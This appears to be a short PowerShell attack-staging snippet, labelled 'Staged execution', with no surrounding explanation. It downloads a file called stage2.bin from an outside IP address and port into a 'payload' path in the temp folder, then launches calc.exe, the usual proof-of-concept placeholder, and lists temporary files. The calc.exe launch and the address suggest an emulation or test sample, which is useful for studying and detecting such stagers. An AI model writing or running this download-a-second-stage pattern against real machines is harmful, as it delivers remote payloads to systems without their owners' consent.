
<# Staged execution #> $DownloadUrl = 'https://203.0.113.58:8443/cdn/stage2.bin'; $PayloadPath = "$env:TEMP\payload.bin"; curl.exe -s -L -o $PayloadPath $DownloadUrl; & "calc.exe"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
